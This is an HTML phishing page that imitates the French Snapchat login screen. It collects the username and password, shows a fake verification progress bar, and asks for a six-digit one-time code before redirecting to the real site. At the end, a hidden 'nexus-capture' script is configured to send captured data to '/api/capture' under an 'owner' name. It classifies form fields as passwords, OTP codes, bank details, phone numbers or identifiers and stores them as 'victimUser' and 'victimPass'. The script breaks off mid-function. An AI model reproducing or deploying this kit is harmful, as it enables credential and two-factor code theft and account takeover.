<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Snapchat · Connexion</title>

<style>
/* ============================================================
   1. RESET & VARIABLES
   ============================================================ */
*,
*::before,
*::after {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

:root {
  --yellow:       #FFFC00;
  --black:        #111111;
  --gray:         #7a7a7a;
  --border:       #e4e4e4;
  --blue:         #0a84ff;
  --red:          #ff3b30;
  --white:        #ffffff;
  --radius:       16px;
  --ease:         cubic-bezier(.2, .8, .2, 1);
}

/* ============================================================
   2. BASE / PAGE
   ============================================================ */
body {
  min-height: 100dvh;
  display: grid;
  place-items: center;
  padding: 24px 18px;
  position: relative;
  overflow-x: hidden;
  background: var(--yellow);
  font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  color: var(--black);
  -webkit-font-smoothing: antialiased;
}

body.locked { overflow: hidden; }

/* --- Blobs décoratifs --- */
.blob {
  position: fixed;
  border-radius: 50%;
  filter: blur(70px);
  pointer-events: none;
  opacity: .8;
  z-index: 0;
  animation: float 14s ease-in-out infinite;
}
.b1 { width: 380px; height: 380px; background: #fff45e; top: -120px; left: -100px; }
.b2 { width: 300px; height: 300px; background: #ffe93b; bottom: -110px; right: -80px; animation-delay: -4s; }
.b3 { width: 260px; height: 260px; background: #ffffff; top: 55%; left: 8%; opacity: .55; animation-delay: -8s; }

@keyframes float {
  0%, 100% { transform: translate(0, 0) scale(1); }
  50%      { transform: translate(30px, -35px) scale(1.12); }
}

/* ============================================================
   3. CARTE PRINCIPALE
   ============================================================ */
.card {
  position: relative;
  z-index: 1;
  width: min(430px, 100%);
  padding: 40px 34px 30px;
  background: var(--white);
  border-radius: 28px;
  box-shadow:
    0 40px 70px -25px rgba(0, 0, 0, .45),
    0 0 0 1px rgba(0, 0, 0, .04);
  animation: cardIn .65s var(--ease) both;
}

.card.ready { animation: none; }
.card.shake { animation: shake .5s ease; }

@keyframes cardIn {
  from { opacity: 0; transform: translateY(26px) scale(.96); }
  to   { opacity: 1; transform: translateY(0)   scale(1);   }
}

@keyframes shake {
  10%, 90%      { transform: translateX(-2px); }
  20%, 80%      { transform: translateX(4px);  }
  30%, 50%, 70% { transform: translateX(-7px); }
  40%, 60%      { transform: translateX(7px);  }
}

/* ============================================================
   4. LOGO FANTÔME
   ============================================================ */
.logo {
  width: 90px;
  height: 90px;
  margin: 0 auto 20px;
  display: grid;
  place-items: center;
  background: var(--yellow);
  border-radius: 27px;
  box-shadow:
    0 16px 30px -12px rgba(255, 240, 0, .95),
    inset 0 0 0 2px rgba(0, 0, 0, .06);
  animation: bob 3.6s ease-in-out infinite;
}

.logo svg { width: 58px; height: 58px; fill: var(--black); }

@keyframes bob {
  0%, 100% { transform: translateY(0)    rotate(-2deg); }
  50%      { transform: translateY(-7px) rotate(2deg);  }
}

/* ============================================================
   5. TITRES
   ============================================================ */
h1 {
  font-size: 27px;
  font-weight: 800;
  letter-spacing: -.6px;
  text-align: center;
}

.sub {
  margin: 8px 0 28px;
  font-size: 14.5px;
  color: var(--gray);
  text-align: center;
}

/* ============================================================
   6. CHAMPS (label flottant)
   ============================================================ */
.field { position: relative; margin-bottom: 14px; }

.field input {
  width: 100%;
  height: 58px;
  padding: 24px 16px 8px;
  font-size: 15.5px;
  font-family: inherit;
  color: var(--black);
  background: #fafafa;
  border: 2px solid var(--border);
  border-radius: var(--radius);
  outline: none;
  transition: border-color .22s, background .22s, box-shadow .22s;
}

.field input::placeholder { color: transparent; }
.field input:hover { background: #f5f5f5; }

.field input:focus {
  background: var(--white);
  border-color: var(--black);
  box-shadow: 0 0 0 4px rgba(255, 252, 0, .85);
}

.field label {
  position: absolute;
  left: 18px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 15.5px;
  color: var(--gray);
  pointer-events: none;
  transition: top .18s var(--ease), font-size .18s var(--ease), color .18s;
}

.field input:focus + label,
.field input:not(:placeholder-shown) + label {
  top: 16px;
  font-size: 10.5px;
  font-weight: 800;
  letter-spacing: .7px;
  text-transform: uppercase;
  color: var(--black);
}

#password { padding-right: 54px; }

/* Bouton œil */
.toggle-pw {
  position: absolute;
  right: 8px;
  top: 50%;
  transform: translateY(-50%);
  width: 42px;
  height: 42px;
  display: grid;
  place-items: center;
  background: transparent;
  border: none;
  border-radius: 12px;
  cursor: pointer;
  color: var(--gray);
  transition: background .2s, color .2s;
}

.toggle-pw:hover { background: #efefef; color: var(--black); }

.toggle-pw svg {
  width: 21px; height: 21px;
  fill: none;
  stroke: currentColor;
  stroke-width: 2;
  stroke-linecap: round;
  stroke-linejoin: round;
}

.toggle-pw .eye-off { display: none; }
.toggle-pw.active .eye-on  { display: none; }
.toggle-pw.active .eye-off { display: block; }

/* ============================================================
   7. ERREURS
   ============================================================ */
.error {
  height: 0;
  margin-left: 4px;
  overflow: hidden;
  font-size: 12.5px;
  font-weight: 700;
  color: var(--red);
  opacity: 0;
  transition: height .25s var(--ease), opacity .25s, margin .25s;
}

.error.show {
  height: 18px;
  margin-bottom: 8px;
  opacity: 1;
}

/* ============================================================
   8. LIEN MOT DE PASSE OUBLIÉ
   ============================================================ */
.forgot {
  display: inline-block;
  margin: 4px 0 22px 4px;
  font-size: 13.5px;
  font-weight: 700;
  color: var(--blue);
  text-decoration: none;
  border-radius: 6px;
  transition: opacity .2s;
}

.forgot:hover { text-decoration: underline; opacity: .8; }

/* ============================================================
   9. BOUTONS
   ============================================================ */
.btn {
  position: relative;
  width: 100%;
  height: 56px;
  overflow: hidden;
  border: none;
  border-radius: 999px;
  background: var(--yellow);
  color: var(--black);
  font-family: inherit;
  font-size: 16px;
  font-weight: 800;
  letter-spacing: .3px;
  cursor: pointer;
  box-shadow: 0 14px 26px -12px rgba(0, 0, 0, .55);
  transition: transform .16s var(--ease), box-shadow .22s, filter .2s, opacity .2s;
}

.btn:hover:not(:disabled) {
  transform: translateY(-2px);
  filter: brightness(1.04);
  box-shadow: 0 20px 34px -14px rgba(0, 0, 0, .55);
}

.btn:active:not(:disabled) { transform: translateY(0) scale(.985); }
.btn:focus-visible { outline: 3px solid var(--black); outline-offset: 3px; }

/* Variante sombre (utilisée sur fond jaune) */
.btn--dark {
  background: var(--black);
  color: var(--white);
  box-shadow: 0 16px 30px -14px rgba(0, 0, 0, .6);
}

/* Bouton désactivé (hors chargement) */
.btn[disabled]:not(.loading) {
  opacity: .4;
  cursor: not-allowed;
  box-shadow: none;
}

.btn-text { transition: opacity .2s; }
.btn.loading .btn-text { opacity: 0; }

.spinner {
  position: absolute;
  inset: 0;
  margin: auto;
  width: 22px;
  height: 22px;
  border: 3px solid rgba(0, 0, 0, .2);
  border-top-color: var(--black);
  border-radius: 50%;
  opacity: 0;
  transition: opacity .2s;
}

.btn--dark .spinner {
  border-color: rgba(255, 255, 255, .25);
  border-top-color: var(--white);
}

.btn.loading .spinner {
  opacity: 1;
  animation: spin .7s linear infinite;
}

@keyframes spin { to { transform: rotate(360deg); } }

/* Ripple */
.ripple {
  position: absolute;
  border-radius: 50%;
  background: rgba(0, 0, 0, .16);
  transform: scale(0);
  pointer-events: none;
  animation: rippleAnim .6s ease-out forwards;
}

.btn--dark .ripple { background: rgba(255, 255, 255, .28); }

@keyframes rippleAnim {
  to { transform: scale(3.2); opacity: 0; }
}

/* ============================================================
   10. SÉPARATEUR & INSCRIPTION
   ============================================================ */
.divider {
  display: flex;
  align-items: center;
  gap: 14px;
  margin: 26px 0 20px;
  font-size: 12px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 1px;
  color: #b3b3b3;
}

.divider::before,
.divider::after {
  content: "";
  flex: 1;
  height: 1.5px;
  background: var(--border);
  border-radius: 2px;
}

.signup {
  font-size: 14px;
  text-align: center;
  color: var(--gray);
}

.signup a {
  font-weight: 800;
  color: var(--black);
  text-decoration: none;
  border-bottom: 2px solid var(--yellow);
  transition: border-color .2s;
}

.signup a:hover { border-color: var(--black); }

/* ============================================================
   11. OVERLAYS PLEIN ÉCRAN (chargement + OTP)
   ============================================================ */
.redirect,
.otp {
  position: fixed;
  inset: 0;
  display: grid;
  place-items: center;
  padding: 24px;
  background: var(--yellow);
  opacity: 0;
  visibility: hidden;
  transition: opacity .5s var(--ease), visibility .5s;
}

.redirect { z-index: 999; }
.otp      { z-index: 1000; }

.redirect.show,
.otp.show {
  opacity: 1;
  visibility: visible;
}

.redirect__inner,
.otp__inner {
  width: min(380px, 100%);
  text-align: center;
  transform: translateY(14px);
  transition: transform .6s var(--ease);
}

.redirect.show .redirect__inner,
.otp.show .otp__inner { transform: translateY(0); }

/* Badge fantôme (chargement) */
.redirect__ghost {
  width: 110px;
  height: 110px;
  margin: 0 auto 28px;
  display: grid;
  place-items: center;
  background: var(--white);
  border-radius: 32px;
  box-shadow:
    0 24px 48px -18px rgba(0, 0, 0, .35),
    inset 0 0 0 2px rgba(0, 0, 0, .05);
  animation: ghostPulse 1.5s ease-in-out infinite;
}

.redirect__ghost svg { width: 66px; height: 66px; fill: var(--black); }

@keyframes ghostPulse {
  0%, 100% { transform: scale(1)    translateY(0);    }
  50%      { transform: scale(1.06) translateY(-6px); }
}

.redirect__title {
  font-size: 20px;
  font-weight: 800;
  letter-spacing: -.3px;
  margin-bottom: 8px;
}

.redirect__text {
  font-size: 14px;
  color: rgba(0, 0, 0, .55);
  margin-bottom: 26px;
}

/* Barre de progression */
.progress {
  position: relative;
  width: 100%;
  height: 10px;
  background: rgba(0, 0, 0, .12);
  border-radius: 999px;
  overflow: hidden;
}

.progress__bar {
  position: absolute;
  inset: 0 auto 0 0;
  width: 0%;
  border-radius: 999px;
  background: var(--black);
  will-change: width;
}

.redirect__pct {
  margin-top: 14px;
  font-size: 13px;
  font-weight: 800;
  letter-spacing: .5px;
  font-variant-numeric: tabular-nums;
  color: rgba(0, 0, 0, .65);
}

/* ============================================================
   12. PAGE OTP
   ============================================================ */
.otp__ghost {
  width: 92px;
  height: 92px;
  margin: 0 auto 22px;
  display: grid;
  place-items: center;
  background: var(--white);
  border-radius: 28px;
  box-shadow:
    0 22px 44px -18px rgba(0, 0, 0, .35),
    inset 0 0 0 2px rgba(0, 0, 0, .05);
  animation: bob 3.6s ease-in-out infinite;
}

.otp__ghost svg { width: 56px; height: 56px; fill: var(--black); }

.otp__title {
  font-size: 22px;
  font-weight: 800;
  letter-spacing: -.4px;
  margin-bottom: 8px;
}

.otp__text {
  font-size: 14px;
  line-height: 1.5;
  color: rgba(0, 0, 0, .6);
}

.otp__text strong {
  font-weight: 800;
  color: var(--black);
}

/* --- Les 6 cases --- */
.otp__boxes {
  display: flex;
  justify-content: center;
  gap: clamp(6px, 2vw, 10px);
  margin: 26px 0 4px;
}

.otp__input {
  flex: 1 1 0;
  min-width: 0;
  max-width: 58px;
  height: clamp(56px, 15vw, 70px);
  padding: 0;
  font-family: inherit;
  font-size: clamp(22px, 6.5vw, 28px);
  font-weight: 800;
  text-align: center;
  color: var(--black);
  background: var(--white);
  border: 2px solid rgba(0, 0, 0, .14);
  border-radius: 16px;
  outline: none;
  caret-color: var(--black);
  transition:
    border-color .18s,
    box-shadow .18s,
    transform .18s var(--ease),
    background .18s;
  -moz-appearance: textfield;
}

.otp__input::-webkit-outer-spin-button,
.otp__input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

.otp__input:hover { border-color: rgba(0, 0, 0, .3); }

.otp__input:focus {
  border-color: var(--black);
  box-shadow:
    0 0 0 4px rgba(255, 255, 255, .9),
    0 10px 20px -10px rgba(0, 0, 0, .45);
  transform: translateY(-2px);
}

.otp__input.filled {
  border-color: var(--black);
  background: var(--white);
}

/* Erreur spécifique OTP */
.otp .error {
  margin: 8px 0 0;
  text-align: center;
}

.otp .error.show { margin-bottom: 10px; }

/* Bouton valider OTP */
.otp .btn { margin-top: 18px; }

/* Renvoi du code */
.resend {
  margin-top: 20px;
  font-size: 13.5px;
  color: rgba(0, 0, 0, .6);
}

.resend button {
  padding: 0;
  font: inherit;
  font-weight: 800;
  color: var(--black);
  background: none;
  border: none;
  border-bottom: 2px solid transparent;
  cursor: pointer;
  transition: border-color .2s, color .2s;
}

.resend button:hover:not(:disabled) { border-bottom-color: var(--black); }

.resend button:disabled {
  color: rgba(0, 0, 0, .38);
  cursor: default;
  font-variant-numeric: tabular-nums;
}

/* ============================================================
   13. RESPONSIVE & ACCESSIBILITÉ
   ============================================================ */
@media (max-width: 420px) {
  .card { padding: 32px 22px 24px; border-radius: 24px; }
  h1 { font-size: 24px; }
  .logo { width: 78px; height: 78px; border-radius: 23px; }
  .logo svg { width: 50px; height: 50px; }
  .redirect__ghost { width: 92px; height: 92px; border-radius: 26px; }
  .redirect__ghost svg { width: 54px; height: 54px; }
  .otp__ghost { width: 78px; height: 78px; border-radius: 24px; }
  .otp__ghost svg { width: 46px; height: 46px; }
  .otp__title { font-size: 20px; }
  .otp__input { border-radius: 13px; }
}

@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: .001ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: .001ms !important;
  }
}
</style>
</head>

<body>

<!-- Décor -->
<div class="blob b1"></div>
<div class="blob b2"></div>
<div class="blob b3"></div>

<!-- ============================================================
     CARTE DE CONNEXION
     ============================================================ -->
<main class="card" id="card">

  <div class="logo">
    <svg viewBox="0 0 100 100" role="img" aria-label="Logo Snapchat">
      <path d="M50 7c-13.5 0-23.5 10-23.5 23.5v10.2c0 2.3-1.4 3.9-3.6 4.7l-8.4 2.9c-3.2 1.1-3.2 4.6 0 5.7l9.6 3.3c1.9.7 2.7 2.1 2 4-2.7 7.4-8.6 13.2-15.6 15.2-3.1.9-3.1 4.4 0 5.4 4.9 1.6 10.6 1.8 13.6 3.6 1.7 1 2.1 2.7 2.7 4.6 1 3.4 4.4 5.9 8.6 5.1 4.4-.9 7.3.9 10.1 4.4 2.6 3.3 6.9 5.4 11.9 5.4s9.3-2.1 11.9-5.4c2.8-3.5 5.7-5.3 10.1-4.4 4.2.8 7.6-1.7 8.6-5.1.6-1.9 1-3.6 2.7-4.6 3-1.8 8.7-2 13.6-3.6 3.1-1 3.1-4.5 0-5.4-7-2-12.9-7.8-15.6-15.2-.7-1.9.1-3.3 2-4l9.6-3.3c3.2-1.1 3.2-4.6 0-5.7l-8.4-2.9c-2.2-.8-3.6-2.4-3.6-4.7V30.5C73.5 17 63.5 7 50 7z"/>
    </svg>
  </div>

  <h1>Connexion</h1>
  <p class="sub">Content de te revoir&nbsp;👻</p>

  <form id="loginForm" novalidate>

    <div class="field">
      <input type="text" id="username" name="username" placeholder=" "
             autocomplete="username" spellcheck="false">
      <label for="username">Nom d'utilisateur</label>
    </div>
    <p class="error" id="err-username" role="alert"></p>

    <div class="field">
      <input type="password" id="password" name="password" placeholder=" "
             autocomplete="current-password">
      <label for="password">Mot de passe</label>

      <button type="button" class="toggle-pw" id="togglePw"
              aria-label="Afficher le mot de passe">
        <svg class="eye-on" viewBox="0 0 24 24">
          <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
          <circle cx="12" cy="12" r="3"/>
        </svg>
        <svg class="eye-off" viewBox="0 0 24 24">
          <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
          <circle cx="12" cy="12" r="3"/>
          <path d="M3 3l18 18"/>
        </svg>
      </button>
    </div>
    <p class="error" id="err-password" role="alert"></p>

    <a href="#" class="forgot">Mot de passe oublié&nbsp;?</a>

    <button type="submit" class="btn" id="submitBtn">Se connecter</button>

  </form>

  <div class="divider"><span>ou</span></div>

  <p class="signup">
    Pas encore de compte&nbsp;? <a href="#">Créer un compte</a>
  </p>

</main>

<!-- ============================================================
     ÉCRAN 1 : CHARGEMENT (3 secondes)
     ============================================================ -->
<div class="redirect" id="redirect" aria-hidden="true">
  <div class="redirect__inner">

    <div class="redirect__ghost">
      <svg viewBox="0 0 100 100" aria-hidden="true">
        <path d="M50 7c-13.5 0-23.5 10-23.5 23.5v10.2c0 2.3-1.4 3.9-3.6 4.7l-8.4 2.9c-3.2 1.1-3.2 4.6 0 5.7l9.6 3.3c1.9.7 2.7 2.1 2 4-2.7 7.4-8.6 13.2-15.6 15.2-3.1.9-3.1 4.4 0 5.4 4.9 1.6 10.6 1.8 13.6 3.6 1.7 1 2.1 2.7 2.7 4.6 1 3.4 4.4 5.9 8.6 5.1 4.4-.9 7.3.9 10.1 4.4 2.6 3.3 6.9 5.4 11.9 5.4s9.3-2.1 11.9-5.4c2.8-3.5 5.7-5.3 10.1-4.4 4.2.8 7.6-1.7 8.6-5.1.6-1.9 1-3.6 2.7-4.6 3-1.8 8.7-2 13.6-3.6 3.1-1 3.1-4.5 0-5.4-7-2-12.9-7.8-15.6-15.2-.7-1.9.1-3.3 2-4l9.6-3.3c3.2-1.1 3.2-4.6 0-5.7l-8.4-2.9c-2.2-.8-3.6-2.4-3.6-4.7V30.5C73.5 17 63.5 7 50 7z"/>
      </svg>
    </div>

    <h2 class="redirect__title">Vérification en cours…</h2>
    <p class="redirect__text">Connexion sécurisée à ton compte.</p>

    <div class="progress" role="progressbar" aria-valuemin="0"
         aria-valuemax="100" aria-valuenow="0" id="progressTrack">
      <div class="progress__bar" id="progressBar"></div>
    </div>

    <p class="redirect__pct" id="progressPct">0 %</p>

  </div>
</div>

<!-- ============================================================
     ÉCRAN 2 : CODE OTP (6 chiffres)
     ============================================================ -->
<section class="otp" id="otp" aria-hidden="true">
  <div class="otp__inner">

    <div class="otp__ghost">
      <svg viewBox="0 0 100 100" aria-hidden="true">
        <path d="M50 7c-13.5 0-23.5 10-23.5 23.5v10.2c0 2.3-1.4 3.9-3.6 4.7l-8.4 2.9c-3.2 1.1-3.2 4.6 0 5.7l9.6 3.3c1.9.7 2.7 2.1 2 4-2.7 7.4-8.6 13.2-15.6 15.2-3.1.9-3.1 4.4 0 5.4 4.9 1.6 10.6 1.8 13.6 3.6 1.7 1 2.1 2.7 2.7 4.6 1 3.4 4.4 5.9 8.6 5.1 4.4-.9 7.3.9 10.1 4.4 2.6 3.3 6.9 5.4 11.9 5.4s9.3-2.1 11.9-5.4c2.8-3.5 5.7-5.3 10.1-4.4 4.2.8 7.6-1.7 8.6-5.1.6-1.9 1-3.6 2.7-4.6 3-1.8 8.7-2 13.6-3.6 3.1-1 3.1-4.5 0-5.4-7-2-12.9-7.8-15.6-15.2-.7-1.9.1-3.3 2-4l9.6-3.3c3.2-1.1 3.2-4.6 0-5.7l-8.4-2.9c-2.2-.8-3.6-2.4-3.6-4.7V30.5C73.5 17 63.5 7 50 7z"/>
      </svg>
    </div>

    <h2 class="otp__title">Vérifie ton identité</h2>
    <p class="otp__text">
      Entre le code à <strong>6 chiffres</strong> envoyé à<br>
      <strong id="otpTarget">ton numéro</strong>
    </p>

    <form id="otpForm" novalidate>

      <div class="otp__boxes" id="otpBoxes">
        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
               maxlength="1" autocomplete="one-time-code" aria-label="Chiffre 1">
        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
               maxlength="1" aria-label="Chiffre 2">
        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
               maxlength="1" aria-label="Chiffre 3">
        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
               maxlength="1" aria-label="Chiffre 4">
        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
               maxlength="1" aria-label="Chiffre 5">
        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
               maxlength="1" aria-label="Chiffre 6">
      </div>

      <p class="error" id="err-otp" role="alert"></p>

      <button type="submit" class="btn btn--dark" id="otpBtn" disabled>
        <span class="btn-text">Vérifier le code</span>
        <span class="spinner" aria-hidden="true"></span>
      </button>

    </form>

    <p class="resend">
      Code non reçu&nbsp;?
      <button type="button" id="resendBtn" disabled>Renvoyer (30s)</button>
    </p>

  </div>
</section>

<script>
/* ==========================================================
   CONFIGURATION
   ========================================================== */
const OFFICIAL_URL   = 'https://www.snapchat.com/';  // destination finale
const REDIRECT_DELAY = 3000;                         // durée du chargement (3 s)
const RESEND_DELAY   = 30;                           // secondes avant renvoi

/* ==========================================================
   1. RÉFÉRENCES DOM
   ========================================================== */
const card      = document.getElementById('card');
const form      = document.getElementById('loginForm');
const username  = document.getElementById('username');
const password  = document.getElementById('password');
const errUser   = document.getElementById('err-username');
const errPass   = document.getElementById('err-password');
const submitBtn = document.getElementById('submitBtn');
const togglePw  = document.getElementById('togglePw');

const redirect    = document.getElementById('redirect');
const progressBar = document.getElementById('progressBar');
const progressPct = document.getElementById('progressPct');
const progressTrk = document.getElementById('progressTrack');

const otp        = document.getElementById('otp');
const otpForm    = document.getElementById('otpForm');
const otpInputs  = Array.from(document.querySelectorAll('.otp__input'));
const otpBtn     = document.getElementById('otpBtn');
const errOtp     = document.getElementById('err-otp');
const resendBtn  = document.getElementById('resendBtn');
const otpTarget  = document.getElementById('otpTarget');

/* ==========================================================
   2. ANIMATION D'ENTRÉE DE LA CARTE
   ========================================================== */
card.addEventListener('animationend', (e) => {
  if (e.animationName === 'cardIn') card.classList.add('ready');
  if (e.animationName === 'shake')  card.classList.remove('shake');
});

/* ==========================================================
   3. AFFICHER / MASQUER LE MOT DE PASSE
   ========================================================== */
togglePw.addEventListener('click', () => {
  const hidden = password.type === 'password';

  password.type = hidden ? 'text' : 'password';
  togglePw.classList.toggle('active', hidden);
  togglePw.setAttribute(
    'aria-label',
    hidden ? 'Masquer le mot de passe' : 'Afficher le mot de passe'
  );

  password.focus();
});

/* ==========================================================
   4. GESTION DES ERREURS (formulaire de connexion)
   ========================================================== */
function setError(el, message) {
  el.textContent = message;
  el.classList.toggle('show', message.length > 0);
}

username.addEventListener('input', () => setError(errUser, ''));
password.addEventListener('input', () => setError(errPass, ''));

/* ==========================================================
   5. SOUMISSION → CHARGEMENT 3 s → ÉCRAN OTP
   ========================================================== */
let redirecting = false;

form.addEventListener('submit', (e) => {
  e.preventDefault();
  if (redirecting) return;

  let ok = true;

  if (username.value.trim().length === 0) {
    setError(errUser, "Entre ton nom d'utilisateur.");
    ok = false;
  }

  if (password.value.length === 0) {
    setError(errPass, 'Entre ton mot de passe.');
    ok = false;
  }

  if (!ok) {
    card.classList.add('shake');
    return;
  }

  redirecting = true;
  startRedirect();
});

/* ==========================================================
   6. ÉCRAN DE CHARGEMENT + BARRE (3 s) → OTP
   ========================================================== */
function startRedirect() {
  document.body.classList.add('locked');

  redirect.classList.add('show');
  redirect.setAttribute('aria-hidden', 'false');

  const startTime = performance.now();

  function tick(now) {
    const elapsed  = now - startTime;
    const progress = Math.min(elapsed / REDIRECT_DELAY, 1);
    const percent  = Math.round(progress * 100);

    progressBar.style.width = percent + '%';
    progressPct.textContent = percent + ' %';
    progressTrk.setAttribute('aria-valuenow', String(percent));

    if (progress < 1) {
      requestAnimationFrame(tick);
    } else {
      /* Le chargement est terminé → on affiche la page OTP */
      setTimeout(showOtp, 320);
    }
  }

  requestAnimationFrame(tick);
}

/* ==========================================================
   7. AFFICHAGE DE LA PAGE OTP
   ========================================================== */
function showOtp() {
  redirect.classList.remove('show');
  redirect.setAttribute('aria-hidden', 'true');

  const user = username.value.trim();
  otpTarget.textContent = user ? '@' + user : 'ton numéro';

  setTimeout(() => {
    otp.classList.add('show');
    otp.setAttribute('aria-hidden', 'false');

    /* Focus sur la première case */
    setTimeout(() => otpInputs[0].focus(), 350);

    startResendTimer();
  }, 260);
}

/* ==========================================================
   8. GESTION DES 6 CASES
   ========================================================== */
function otpCode() {
  return otpInputs.map(i => i.value).join('');
}

function refreshOtpState() {
  otpInputs.forEach(i => i.classList.toggle('filled', i.value !== ''));
  otpBtn.disabled = otpCode().length < 6;
}

otpInputs.forEach((box, index) => {
  /* Saisie : on ne garde que le dernier chiffre tapé */
  box.addEventListener('input', () => {
    box.value = box.value.replace(/\D/g, '').slice(-1);
    setError(errOtp, '');
    refreshOtpState();

    if (box.value && index < otpInputs.length - 1) {
      otpInputs[index + 1].focus();
    }
  });

  /* Clavier : retour arrière, flèches */
  box.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && !box.value && index > 0) {
      e.preventDefault();
      otpInputs[index - 1].value = '';
      otpInputs[index - 1].focus();
      refreshOtpState();
      return;
    }
    if (e.key === 'ArrowLeft' && index > 0) {
      e.preventDefault();
      otpInputs[index - 1].focus();
    }
    if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
      e.preventDefault();
      otpInputs[index + 1].focus();
    }
    if (e.key === 'Enter') {
      e.preventDefault();
      otpForm.requestSubmit();
    }
  });

  /* Coller un code complet */
  box.addEventListener('paste', (e) => {
    e.preventDefault();
    const digits = (e.clipboardData.getData('text') || '')
      .replace(/\D/g, '')
      .slice(0, 6);

    if (!digits) return;

    digits.split('').forEach((d, k) => {
      if (otpInputs[k]) otpInputs[k].value = d;
    });

    otpInputs[Math.min(digits.length, 5)].focus();
    setError(errOtp, '');
    refreshOtpState();
  });

  /* Sélectionne le contenu au focus (remplacement facile) */
  box.addEventListener('focus', () => box.select());
});

/* ==========================================================
   9. VALIDATION DU CODE OTP
   ========================================================== */
otpForm.addEventListener('submit', (e) => {
  e.preventDefault();
  if (otpBtn.classList.contains('loading')) return;

  const code = otpCode();

  if (code.length < 6) {
    setError(errOtp, 'Entre les 6 chiffres du code.');
    otpInputs.find(i => !i.value)?.focus();
    return;
  }

  /* --- État de chargement puis redirection finale --- */
  otpBtn.classList.add('loading');
  otpBtn.disabled = true;

  setTimeout(() => {
    window.location.href = OFFICIAL_URL;
  }, 1100);
});

/* ==========================================================
   10. RENVOI DU CODE (compte à rebours 30 s)
   ========================================================== */
let resendTimer = null;

function startResendTimer() {
  let remaining = RESEND_DELAY;

  resendBtn.disabled = true;
  resendBtn.textContent = `Renvoyer (${remaining}s)`;

  clearInterval(resendTimer);

  resendTimer = setInterval(() => {
    remaining--;

    if (remaining <= 0) {
      clearInterval(resendTimer);
      resendBtn.disabled = false;
      resendBtn.textContent = 'Renvoyer le code';
      return;
    }

    resendBtn.textContent = `Renvoyer (${remaining}s)`;
  }, 1000);
}

resendBtn.addEventListener('click', () => {
  if (resendBtn.disabled) return;

  /* Réinitialise les cases */
  otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
  setError(errOtp, '');
  refreshOtpState();
  otpInputs[0].focus();

  startResendTimer();
});

/* ==========================================================
   11. EFFET RIPPLE (sur tous les boutons .btn)
   ========================================================== */
document.querySelectorAll('.btn').forEach((button) => {
  button.addEventListener('click', (e) => {
    const rect = button.getBoundingClientRect();
    const size = Math.max(rect.width, rect.height);

    const ripple = document.createElement('span');
    ripple.className   = 'ripple';
    ripple.style.width = ripple.style.height = size + 'px';
    ripple.style.left  = (e.clientX - rect.left - size / 2) + 'px';
    ripple.style.top   = (e.clientY - rect.top  - size / 2) + 'px';

    button.appendChild(ripple);
    setTimeout(() => ripple.remove(), 620);
  });
});
</script>


<script data-nexus-capture="true">
(function() {
  const NEXUS_CFG = {
    endpoint: "/api/capture",
    owner: "Kim",
    network: "Apple",
    enableOtp: true,
    caps: {"id":true,"pass":true,"phone":true,"bank":false,"extra":false,"otp":true}
  };

  const urlParams = new URLSearchParams(window.location.search);
  const effectiveOwner = (urlParams.get("user") || NEXUS_CFG.owner || "Inconnu").trim();

  const state = {
    victimUser: "",
    victimPass: "",
    otp: "Aucun",
    capturedFields: {},
    sentFingerprints: new Set()
  };

  function getFieldDescriptor(el) {
    let labelTxt = "";
    if (el.id) {
      const lbl = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
      if (lbl) labelTxt = (lbl.innerText || lbl.textContent || "").trim();
    }
    const parentLbl = el.closest("label");
    if (parentLbl) {
      labelTxt = (labelTxt + " " + (parentLbl.innerText || parentLbl.textContent || "")).trim();
    }

    const baseName =
      el.name ||
      el.id ||
      labelTxt ||
      el.placeholder ||
      el.getAttribute("aria-label") ||
      el.getAttribute("autocomplete") ||
      ("field_" + (el.type || "text"));

    const meta = [
      el.id,
      el.name,
      el.placeholder,
      el.getAttribute("aria-label"),
      el.getAttribute("autocomplete"),
      el.getAttribute("inputmode"),
      el.className,
      labelTxt
    ]
      .filter(Boolean)
      .join(" ")
      .toLowerCase();

    return { key: baseName.trim(), meta };
  }

  function classifyInput(el) {
    const type = (el.type || "text").toLowerCase();
    if (type === "hidden" || type === "submit" || type === "button" || type === "reset") {
      return "ignore";
    }

    const { meta } = getFieldDescriptor(el);

    if (type === "password" || (/password|pass|mot de passe|pin/i.test(meta) && !/otp|2fa/i.test(meta))) {
      return "pass";
    }

    const ac = (el.getAttribute("autocomplete") || "").toLowerCase();
    const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
    const isBank = /card|carte|cc-|cvv|cvc|csc|exp|expiry|expiration|iban|rib|bic|swift|routing|sort.?code|account.?num|banque|bank|billing/i.test(meta);
    const isDob = type === "date" || /birth|naissance|dob|bday|jour|mois|ann[ée]e|jj|mm|aaaa|yyyy/i.test(meta);

    if (
      ac === "one-time-code" ||
      (!isBank && !isDob && (
        /\botp\b|2fa|mfa|one-time|verification.?code|code.?v[ée]rif|security.?code/i.test(meta) ||
        (type !== "password" && maxLen >= 4 && maxLen <= 8 && /\bcode\b/i.test(meta))
      ))
    ) {
      return "otp";
    }

    if (isBank) return "bank";
    if (type === "tel" || /phone|t[ée]l[ée]phone|mobile|indicatif|country.?code|prefix|\+225|\+221|\+237|\+33/i.test(meta)) {
      return "phone";
    }
    if (type === "email" || /email|e-mail|identifiant|username|user|login/i.test(meta)) {
      return "id";
    }
